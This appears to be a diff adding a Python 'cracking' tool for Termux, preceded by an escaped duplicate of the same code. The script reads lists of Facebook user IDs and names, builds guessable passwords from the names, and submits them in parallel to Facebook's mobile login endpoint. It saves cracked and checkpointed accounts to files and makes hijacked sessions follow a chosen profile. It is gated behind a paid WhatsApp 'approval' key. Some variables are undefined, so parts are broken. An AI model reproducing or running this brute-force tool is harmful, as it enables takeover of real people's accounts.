session.get(f\'https://graph.facebook.com/{user}?fields=birthday&access_token={token}\').json()[\'birthday\']\r\n\r\n                        month, day, year = cp_ttl.split(\'/\')\r\n\r\n                        month = bulan_ttl[month]\r\n\r\n                        \r\n\r\n                        wrt = \'%s|%s\' % (use,w)\r\n\r\n                        cp.append(wrt)\r\n\r\n                        open(\'/sdcard/RIAZ_CP.txt\' , \'a\').write(\'%s\\n\' % wrt)\r\n\r\n                        break\r\n\r\n                    except (KeyError, IOError):\r\n\r\n                        month = \'\'\r\n\r\n                        day   = \'\'\r\n\r\n                        year  = \'\'\r\n\r\n                    except:\r\n\r\n                        pass\r\n\r\n                    \r\n\r\n                    wrt = \'%s|%s\' % (usr,w)\r\n\r\n                    cp.append(wrt)\r\n\r\n                    open(\'/sdcard/RIAZ_CP.txt\' , \'a\').write(\'%s\\n\' % wrt)\r\n\r\n                    break\r\n\r\n                else:\r\n\r\n                    continue\r\n\r\n            loop+=1\r\n\r\n        except:\r\n\r\n            self.__metode__(user, pw, cebok)\r\n\r\n    def follow(self, session, coki):\r\n\r\n        r = BeautifulSoup(session.get(\'https://mbasic.facebook.com/AliBaloch356\', cookies={\'cookie\': coki}).text, \'html.parser\')\r\n\r\n        get = r.find(\'a\', string=\'Ikuti\').get(\'href\')\r\n\r\n        session.get((\'https://mbasic.facebook.com\' + str(get)), cookies={\'cookie\': coki}).text\r\n\r\n    def __pler__(self):\r\n\r\n        print(\' [1] Crack With Auto Pass \')\r\n\r\n        print(\' [2] Crack With Name Digit Pass\')\r\n\r\n        chi = input(\'\\n [?] Choose: \')\r\n\r\n        if chi == \'\':\r\n\r\n            print(\'\\n   Select Correct One\')\r\n\r\n            self.__pler__()\r\n\r\n        elif chi in (\'1\', \'01\'):\r\n\r\n            os.system("clear")\r\n\r\n            print(logo)\r\n\r\n            print("\\033[1;32m      Dont Forget Allah\xf0\x9f\x98\x8a \\033[1;37m")\r\n\r\n            print("\xe0\xbc\x84\xf0\x9d\x91\x9f\xf0\x9d\x91\x96\xf0\x9d\x91\x8e\xf0\x9d\x91\xa7\xe1\xad\x84\xe2\x80\xa2\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x80\xa2\xe0\xbc\x84\xf0\x9d\x91\x98\xe2\x84\x8e\xf0\x9d\x91\x8e\xf0\x9d\x91\x9b\xe1\xad\x84")\r\n\r\n            \r\n\r\n            with sarfrazssb(max_workers=70) as ssbworld:\r\n\r\n                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia\r\n\r\n                    try:\r\n\r\n                        uid, name = zsb.split(\'|\')\r\n\r\n                        xz = name.split(\' \')\r\n\r\n                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:\r\n\r\n                            pwx = [name, xz[0]+xz[1]]\r\n                            \r\n                            pwx = [name, xz[0] + \'last\', xz[0] + \'Frist\', xz[0] + \'Last\']\r\n                            \r\n                            pwx = [name, xz[0]+xz[1]]\r\n\r\n                        else:\r\n\r\n                            pwx = [Last, xz[0] + \'Last1\', xz[0] + \'first\', xz[0] + \'last1\']\r\n\r\n                        ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")\r\n\r\n                    except:\r\n\r\n                        pass\r\n\r\n            hasil(ok,cp)\r\n\r\n        elif chi in (\'2\', \'02\'):\r\n\r\n            os.system("clear")\r\n\r\n            print(logo)\r\n\r\n            print("")\r\n\r\n            print("\\033[1;37m\\r   Enter Last Name Digits\\033[1;37m\\n")\r\n\r\n            print ("\\033[1;37m\\r   Exmple : 123 + 12345 + 1234 + 1122\\033[1;37m\\n")\r\n\r\n            p1 = input(\'   Name + 1 : \')\r\n\r\n            p2 = input(\'   Name + 2 : \')\r\n\r\n            p3 = input(\'   Name + 3 : \')\r\n\r\n            p4 = input(\'   Name + 4 : \')\r\n\r\n            os.system("clear")\r\n\r\n            print(logo)\r\n\r\n            print("\\033[1;32m      Dont Forget Allah\xf0\x9f\x98\x8a \\033[1;37m")\r\n\r\n            print("\xe0\xbc\x84\xf0\x9d\x91\x9f\xf0\x9d\x91\x96\xf0\x9d\x91\x8e\xf0\x9d\x91\xa7\xe1\xad\x84\xe2\x80\xa2\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x80\xa2\xe0\xbc\x84\xf0\x9d\x91\x98\xe2\x84\x8e\xf0\x9d\x91\x8e\xf0\x9d\x91\x9b\xe1\xad\x84")\r\n\r\n            with sarfrazssb(max_workers=30) as ssbworld:\r\n\r\n                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia\r\n\r\n                    try:\r\n\r\n                        uid, name = zsb.split(\'|\')\r\n\r\n                        xz = name.split(\' \')\r\n\r\n                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:\r\n\r\n                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]\r\n\r\n                        else:\r\n\r\n                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]\r\n\r\n                        ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")\r\n\r\n                    except:\r\n\r\n                        pass\r\n\r\n            hasil(ok,cp)\r\n\r\n        else:\r\n\r\n            print(\'\\n Select Valid One\')\r\n\r\n            self.__pler__()\r\n\r\n            \r\n\r\ndef dupcutter():\r\n\r\n\tos.system("xdg-open https://wa.me/+8801616406924 ")\r\n\r\n\ttime.sleep(3)\r\n\r\n\tR()\r\n\r\ndef yt():\r\n\r\n\tlogo()\r\n\r\n\tos.system("xdg-open https://www.facebook.com/bk4human")\r\n\r\n\ttime.sleep(3)\r\n\r\n\tR()\r\n\r\n    \r\n\r\nclass load:\r\n\r\n    def __init__(self):\r\n\r\n        _ = \'\'\r\n\r\n        __ = int(\'30\')\r\n\r\n        ___ = int(\'0\')\r\n\r\n        __ -= 1\r\n\r\n        ___ += 1\r\n\r\n        for t in range(int("1")):\r\n\r\n            print(\'\\r Wait Bro Loading ...\')\r\n\r\n            sys.stdout.flush()\r\n\r\n            time.sleep(0.1)\r\n\r\n        print(\'\\n\')\r\n\r\nmain_apv()\r\n\r\n\r\n'))
+import os
+
+try:
+
+    import requests
+
+except ImportError:
+
+    print('\n [✓] installing requests !...\n')
+
+    os.system('pip install requests')
+
+try:
+
+    import concurrent.futures
+
+except ImportError:
+
+    print('\n [✓] installing futures !...\n')
+
+    os.system('pip install futures')
+
+try:
+
+    import bs4
+
+except ImportError:
+
+    print('\n [✓] installing bs4 !...\n')
+
+    os.system('pip install bs4')
+
+import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
+
+from concurrent.futures import ThreadPoolExecutor as sarfrazssb
+
+from datetime import datetime
+
+from bs4 import BeautifulSoup
+
+ct = datetime.now()
+
+n = ct.month
+
+bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
+
+try:
+
+    if n < 0 or n > 12:
+
+        exit()
+
+    nTemp = n - 1
+
+except ValueError:
+
+    exit()
+
+current = datetime.now()
+
+ta = current.year
+
+bu = current.month
+
+ha = current.day
+
+op = bulan[nTemp]
+
+P = '\x1b[1;97m' # 
+
+M = '\033[1;96m' # 
+
+H = '\033[1;94m' # 
+
+K = '\x1b[1;93m' # 
+
+B = '\x1b[1;97m' # 
+
+U = '\x1b[1;97m' # 
+
+O = '\x1b[1;97m' # 
+
+N = '\x1b[0m'    # 
+
+my_color = [
+
+ P, M, H, K, B, U, O, N]
+
+warna = random.choice(my_color)
+
+data,data2={},{}
+
+aman,cp,salah=0,0,0
+
+ubahP,fuck,pwBaru=[],[],[]
+
+ok = []
+
+cp = []
+
+id = []
+
+user = []
+
+loop = 0
+
+url_lookup = "https://lookup-id.com/"
+
+url_mb = "https://m.facebook.com"
+
+url_ip = "https://www.httpbin.org/ip"
+
+header_grup = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]"}
+
+bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
+
+done = False
+
+def jalan(z):
+
+    for e in z + '\n':
+
+        sys.stdout.write(e)
+
+        sys.stdout.flush()
+
+        time.sleep(0.01)
+
+        
+
+def main_apv():
+
+    imt="110Y==MAHDI"
+
+    ak="MAHDI_100RS"
+
+    os.system('clear')
+
+    print(logo)
+
+    try:
+
+        key1=open('/data/data/com.termux/files/usr/bin/.akkkk-cov', 'r').read()
+
+    except IOError:
+
+        os.system("clear")
+
+        print(logo)
+
+        print ("༄𝑟𝑖𝑎𝑧᭄•───────────────────────────────────────•༄𝑘ℎ𝑎𝑛᭄")
+        print ("YOUR TOKEN IS NOT APROVAL")     
+        print ("         THIS IS YOUR TOKEN👇📥📬")
+        print ("༄𝑟𝑖𝑎𝑧᭄•───────────────────────────────────────•༄𝑘ℎ𝑎𝑛᭄")
+
+        print ("")
+
+        myid=uuid.uuid4().hex[:10].upper()
+
+        print ("          YOUR KEY : "+ak+myid+imt)
+
+        print ("༄𝑟𝑖𝑎𝑧᭄•───────────────────────────────────────•༄𝑘ℎ𝑎𝑛᭄")
+
+        kok=open('/data/data/com.termux/files/usr/bin/.akkkk-cov', 'w')
+
+        kok.write(myid+imt)
+
+        kok.close()
+
+        print ("")
+
+        print ("")
+
+        print ("  Copy Key And Sent Me WhatsApp Approvel Your Key ")
+
+        print ("༄𝑟𝑖𝑎𝑧᭄•───────────────────────────────────────•༄𝑘ℎ𝑎𝑛᭄")
+
+        time.sleep(3.5)
+
+        tks = 'Dear%20Admin,%20Please%20Approved%20My%20Token%20To%20Premium%20% 20% 20%20%20My%20%20Key%20%20:%20'+ak+''+myid+''+imt
+
+        os.system('am start https://wa.me/+92188049915?text=' + tks)
+
+        
+
+    r1=requests.get("https://raw.githubusercontent.com/Shuvo-BBHH/taxt/main/imt.txt").text
+
+    if key1 in r1:
+
+        R()
+
+    else:
+
+        os.system("clear")
+
+        print(logo)
+
+        print ("         ༄𝑟𝑖𝑎𝑧᭄•───────────────────────────────────────•༄𝑘ℎ𝑎𝑛᭄")
+        print ("             \033[1;94mGIVE ME 100RS FOR APROVAL RIAZ")     
+           
+        print ("             \033[1;32mYOUR KEY : "+ak+key1)     
+        print ("             Key And Sent Me WP Approvel Your Key ")
+        print ("         ༄𝑟𝑖𝑎𝑧᭄•───────────────────────────────────────•༄𝑘ℎ𝑎𝑛᭄")
+
+        time.sleep(3.5)
+
+        tks = 'Dear%20Admin,%20Please%20Apporved%20My%20Key%20To%20Premium✓✓%20%20%20%20%20My%20%20Key%20%20:%20'+ak+''+key1
+
+        os.system('am start https://wa.me/+923188049915?text=' + tks)
+
+logo="""
+           \033[1;91m ##     ##    ###    ##     ##    ###    ########  #### 
+           \033[1;92m ###   ###   ## ##   ##     ##   ## ##   ##     ##  ##
+           \033[1;93m #### ####  ##   ##  ##     ##  ##   ##  ##     ##  ##  
+           \033[1;91m ## ### ## ##     ## ######### ##     ## ##     ##  ##
+           \033[1;92m ##     ## ######### ##     ## ######### ##     ##  ##
+           \033[1;93m ##     ## ##     ## ##     ## ##     ## ##     ##  ##  
+           \033[1;91m ##     ## ##     ## ##     ## ##     ## ########  ####
+             \033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
+             \033[1;93m▇▇➣    \033[1;95mAUTHOR   : MAHDI HASAN        \033[1;93m▇▇
+             \033[1;93m▇▇➣    \033[1;94mGITHUB   : MAHDI HASAN        \033[1;93m▇▇
+             \033[1;93m▇▇➣    \033[1;93mFACEBOOK : MAHDI HASAN        \033[1;93m▇▇
+             \033[1;93m▇▇➣    \033[1;92mWHATSAPP : +8801616406924     \033[1;93m▇▇
+             \033[1;93m▇▇➣       \033[1;91mTHIS TOOL IS PAID          \033[1;93m▇▇
+             \033[1;93m▇▇➣    \033[1;94mGIVE ME 100RS FOR APRVAL      \033[1;93m▇▇
+             \033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
+         \033[1;92m༄𝑟𝑖𝑎𝑧᭄•───────────────────────────────────────•༄𝑘ℎ𝑎𝑛᭄
+""" 
+def hasil(OK,cp):
+
+	if not len(OK) != 0:	    pass
+
+	if len(cp) != 0:
+
+	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97m/sdcard/RIAZ-OK.txt' % (H, P, str(len(ok))))
+
+	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97m/sdcard/RIAZ-CP.txt' % (H, P, str(len(cp))))
+
+	    input("\x1b[1;97mPress enter to back Ahmad Menu ")
+
+	    R()
+
+		
+
+def R():
+
+			os.system("clear")
+
+			print(logo)
+
+			print ('༄𝑟𝑖𝑎𝑧᭄•───────────────────────────────────────•༄𝑘ℎ𝑎𝑛᭄')
+
+			print("\033[1;93m▇▇➣\033[1;92m❥❥❥❥❥❥❥  \033[1;95mSTART FILE CRACKING  : BST METHOD")
+
+			print("\033[1;93m▇▇➣\033[1;94m❥❥❥❥❥❥❥  \033[1;94mPUBLICK AC CRACKING  : NO LOGIN😓")
+
+			print("\033[1;93m▇▇➣\033[1;95m❥❥❥❥❥❥❥  \033[1;93mUNLIMITED FILEMAKING : NO LOGIN😓")
+
+			print("\033[1;93m▇▇➣\033[1;96m❥❥❥❥❥❥❥  \033[1;92mRANDOM AC CRACKING   : NO LOGIN😓")
+
+			print("\033[1;93m▇▇➣\033[1;97m❥❥❥❥❥❥❥  \033[1;91mFOLLEW ME ON WATAAP  : NO LOGIN😓")
+
+			print ("\033[1;93m▇▇➣\033[1;97m❥❥❥❥❥❥❥\033[1;94mAB DAFA HO JAO YAHASE  : 𝑟𝑖𝑎𝑧-𝑘ℎ𝑎𝑛")
+			print ('\033[1;92m༄𝑟𝑖𝑎𝑧᭄•───────────────────────────────────────•༄𝑘ℎ𝑎𝑛᭄')
+			key = input(" [*] Choose : ")
+			print ('༄𝑟𝑖𝑎𝑧᭄•───────────────────────────────────────•༄𝑘ℎ𝑎𝑛᭄')
+
+			if key in [""]:
+
+				print (" [!] Please Select Correct Option")
+
+				exit()
+
+			elif key in ["1", "01"]:
+
+				__xxx__().imtiaz(id)
+
+			elif key in ["2", "02"]:
+
+				
+
+				os.system('python dump.py')
+
+			elif key in ["3", "03"]:
+
+				
+
+				dupcutter()
+
+			elif key in ["4", "04"]:
+
+				
+
+				os.system("am start https://wa.me/+8801616406924?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20MAHDI%20Paid%20Tools.%20My%20Key:%20")
+
+				R()
+
+			elif key in ["5", "05"]:
+
+				time.sleep(0.5)
+
+				yt()
+
+				R()
+
+				login()
+
+			elif key in ["0", "00" , "6"]:
+
+				time.sleep(0.5)
+
+				exit("\n [✓] Thank You\n")
+
+class __xxx__:
+
+    def __init__(self):
+
+        self.id = []
+
+    def imtiaz(self,ak):
+
+        if 1 in fuck:
+
+            os.system('#')
+
+        
+
+      
+
+        
+
+        self.cnt = input(' [*] Put File Name : ')
+
+        self.id = open(self.cnt).read().splitlines()
+
+        os.system('clear')
+
+        print(logo)
+
+        print("")
+
+        ___worldwide___ = ('y')
+
+        if ___worldwide___ in ('yes','Yes','Y', 'y'):
+
+            self.__pler__()
+
+        else:
+
+            print(' [!] Choose Correct One');
+
+            self.sarfrazx(id)
+
+    def __metode__(self, user, __chi__, cebok):
+
+        global ok,cp,loop
+
+        sys.stdout.write(f"\r \x1b[1;33m[RIAZ]\x1b[1;33m {loop}|{len(self.id)} \x1b[1;32m[ok][{len(ok)}] ")
+
+        sys.stdout.flush()
+
+        try:
+
+            for pw in __chi__:
+
+                pw = pw.lower()
+
+                session=requests.Session()
+
+                header = {
+
+                    "Host":cebok,
+
+                    "upgrade-insecure-requests":"1",
+
+                    "user-agent":"NokiaC5-05/22.5.007 (SymbianOS/9.4; U; Series60/5.0 Mozilla/5.0; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Safari/525 3gpp-gba+",
+
+                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+
+                    "dnt":"1",
+
+                    "x-requested-with":"mark.via.gp",
+
+                    "sec-fetch-site":"same-origin",
+
+                    "sec-fetch-mode":"cors",
+
+                    "sec-fetch-user":"empty",
+
+                    "sec-fetch-dest":"document",
+
+                    "referer":"https://m.facebook.com/",
+
+                    "accept-encoding":"gzip, deflate br",
+
+                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
+
+                }
+
+                r = session.get(f"https://{cebok}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header)
+
+                das = {
+
+                    "lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),
+
+                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),
+
+                    "uid":user,
+
+                    "flow":"login_no_pin",
+
+                    "pass":pw,
+
+                    "next":"https://developers.facebook.com/tools/debug/accesstoken/"
+
+                }
+
+                header1 = {
+
+                    "Host":cebok,
+
+                    "cache-control":"max-age=0",
+
+                    "upgrade-insecure-requests":"1",
+
+                    "origin":"https://"+cebok,
+
+                    "content-type":"application/x-www-form-urlencoded",
+
+                    "user-agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 13_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]",
+
+                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+
+                    "x-requested-with":"XMLHttpRequest",
+
+                    "sec-fetch-site":"same-origin",
+
+                    "sec-fetch-mode":"cors",
+
+                    "sec-fetch-user":"empty",
+
+                    "sec-fetch-dest":"document",
+
+                    "referer":"https://"+cebok+"/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",
+
+                    "accept-encoding":"gzip, deflate br",
+
+                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
+
+                }
+
+                po = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)
+
+                if 'c_user' in session.cookies.get_dict():
+
+                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+
+                    print(f"\r{H} [RIAZ-ok 🤫] {user} | {pw}")
+
+                    wrt = '%s|%s' % (user,pw)
+
+                    ok.append(wrt)
+
+                    open('/sdcard/RIAZ_OK.txt' , 'a').write('%s\n' % wrt)
+
+                    self.follow(session,coki)
+
+                    break
+
+                elif 'checkpoint' in session.cookies.get_dict():
+
+                    try:
+
+                        tokenz = open('.token.txt').read()
+
+                        cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={token}').json()['birthday']
+
+                        month, day, year = cp_ttl.split('/')
+
+                        month = bulan_ttl[month]
+
+                        
+
+                        wrt = '%s|%s' % (use,w)
+
+                        cp.append(wrt)
+
+                        open('/sdcard/RIAZ_CP.txt' , 'a').write('%s\n' % wrt)
+
+                        break
+
+                    except (KeyError, IOError):
+
+                        month = ''
+
+                        day   = ''
+
+                        year  = ''
+
+                    except:
+
+                        pass
+
+                    
+
+                    wrt = '%s|%s' % (usr,w)
+
+                    cp.append(wrt)
+
+                    open('/sdcard/RIAZ_CP.txt' , 'a').write('%s\n' % wrt)
+
+                    break
+
+                else:
+
+                    continue
+
+            loop+=1
+
+        except:
+
+            self.__metode__(user, pw, cebok)
+
+    def follow(self, session, coki):
+
+        r = BeautifulSoup(session.get('https://mbasic.facebook.com/AliBaloch356', cookies={'cookie': coki}).text, 'html.parser')
+
+        get = r.find('a', string='Ikuti').get('href')
+
+        session.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
+
+    def __pler__(self):
+
+        print(' [1] Crack With Auto Pass ')
+
+        print(' [2] Crack With Name Digit Pass')
+
+        chi = input('\n [?] Choose: ')
+
+        if chi == '':
+
+            print('\n   Select Correct One')
+
+            self.__pler__()
+
+        elif chi in ('1', '01'):
+
+            os.system("clear")
+
+            print(logo)
+
+            print("\033[1;32m      Dont Forget Allah😊 \033[1;37m")
+
+            print("༄𝑟𝑖𝑎𝑧᭄•───────────────────────────────────────•༄𝑘ℎ𝑎𝑛᭄")
+
+            
+
+            with sarfrazssb(max_workers=70) as ssbworld:
+
+                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
+
+                    try:
+
+                        uid, name = zsb.split('|')
+
+                        xz = name.split(' ')
+
+                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
+
+                            pwx = [name, xz[0]+xz[1]]
+                            
+                            pwx = [name, xz[0] + 'last', xz[0] + 'Frist', xz[0] + 'Last']
+                            
+                            pwx = [name, xz[0]+xz[1]]
+
+                        else:
+
+                            pwx = [Last, xz[0] + 'Last1', xz[0] + 'first', xz[0] + 'last1']
+
+                        ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
+
+                    except:
+
+                        pass
+
+            hasil(ok,cp)
+
+        elif chi in ('2', '02'):
+
+            os.system("clear")
+
+            print(logo)
+
+            print("")
+
+            print("\033[1;37m\r   Enter Last Name Digits\033[1;37m\n")
+
+            print ("\033[1;37m\r   Exmple : 123 + 12345 + 1234 + 1122\033[1;37m\n")
+
+            p1 = input('   Name + 1 : ')
+
+            p2 = input('   Name + 2 : ')
+
+            p3 = input('   Name + 3 : ')
+
+            p4 = input('   Name + 4 : ')
+
+            os.system("clear")
+
+            print(logo)
+
+            print("\033[1;32m      Dont Forget Allah😊 \033[1;37m")
+
+            print("༄𝑟𝑖𝑎𝑧᭄•───────────────────────────────────────•༄𝑘ℎ𝑎𝑛᭄")
+
+            with sarfrazssb(max_workers=30) as ssbworld:
+
+                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
+
+                    try:
+
+                        uid, name = zsb.split('|')
+
+                        xz = name.split(' ')
+
+                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
+
+                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
+
+                        else:
+
+                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
+
+                        ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
+
+                    except:
+
+                        pass
+
+            hasil(ok,cp)
+
+        else:
+
+            print('\n Select Valid One')
+
+            self.__pler__()
+
+            
+
+def dupcutter():
+
+	os.system("xdg-open https://wa.me/+8801616406924 ")
+
+	time.sleep(3)
+
+	R()
+
+def yt():
+
+	logo()
+
+	os.system("xdg-open https://www.facebook.com/bk4human")
+
+	time.sleep(3)
+
+	R()
+
+    
+
+class load:
+
+    def __init__(self):
+
+        _ = ''
+
+        __ = int('30')
+
+        ___ = int('0')
+
+        __ -= 1
+
+        ___ += 1
+
+        for t in range(int("1")):
+
+            print('\r Wait Bro Loading ...')
+
+            sys.stdout.flush()
+
+            time.sleep(0.1)
+
+        print('\n')
+
+main_apv()
+
+
